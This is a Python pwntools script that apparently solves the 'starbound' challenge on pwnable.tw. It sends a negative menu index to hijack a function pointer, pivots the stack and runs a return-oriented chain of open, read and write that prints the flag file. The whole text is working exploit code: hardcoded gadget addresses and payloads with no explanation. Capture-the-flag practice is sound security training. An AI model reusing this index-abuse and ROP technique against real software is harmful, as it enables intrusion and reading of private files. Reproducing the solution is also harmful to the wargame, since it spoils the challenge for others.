import pwn

LOCAL = 0
if LOCAL:
    p = pwn.process("./starbound")
else:
    p = pwn.remote('chall.pwnable.tw', 10202)
# 0x08058180 ''
payload1 = pwn.p32(0x08048e48) # add esp, 0x1c ; ret
payload1 += b'/home/starbound/flag\x00'
p.sendlineafter(b'>', b'6')
p.sendlineafter(b'>', b'2')
p.sendlineafter(b'Enter your name:', payload1)

payload2 = b'-33\x00' + b'A'*4
payload2 += pwn.p32(0x8048970) # plt open()
payload2 += pwn.p32(0x08048936) # skip 3 stack
payload2 += pwn.p32(0x80580d4) #flag
payload2 += pwn.p32(0)
payload2 += b"AAAA"
payload2 += pwn.p32(0x8048a70) # read plt
payload2 += pwn.p32(0x08048936) # skip 3 stack
payload2 += pwn.p32(0x3)
payload2 += pwn.p32(0x8058180) #buffer
payload2 += pwn.p32(100)
payload2 += pwn.p32(0x08048a30) # write
payload2 += pwn.p32(0xDEADBEEF)
payload2 += pwn.p32(0x1)
payload2 += pwn.p32(0x8058180)
payload2 += pwn.p32(100)


#pwn.gdb.attach(p, gdbscript='b *0x0804a65d')
p.sendlineafter(b'>', payload2)
p.interactive()                                                                                                 
